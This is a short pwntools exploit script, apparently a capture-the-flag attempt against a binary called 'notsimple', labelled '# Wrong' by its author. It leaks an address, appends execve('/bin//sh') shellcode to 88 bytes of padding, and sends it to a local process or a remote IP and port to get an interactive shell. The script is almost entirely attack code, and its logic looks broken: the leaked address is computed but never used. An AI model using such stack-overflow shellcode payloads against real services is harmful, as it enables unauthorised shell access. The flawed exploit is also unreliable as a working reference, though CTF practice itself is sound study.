# Wrong
from pwn import *

DEBUG = True

if DEBUG:
    r = process("./notsimple")
    gdb.attach(r)
else:
    r = remote("193.57.159.27", 37284)

leak = int(r.recvuntil(b'> ').split()[3], 16) + 0x58 + 8
shellcode = "\x48\x31\xC0\x50\x48\xB8\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x31\xC0\x48\x83\xF0\x3B\x0F\x05"
payload = "A"*88 + shellcode

r.sendline(payload)

r.interactive()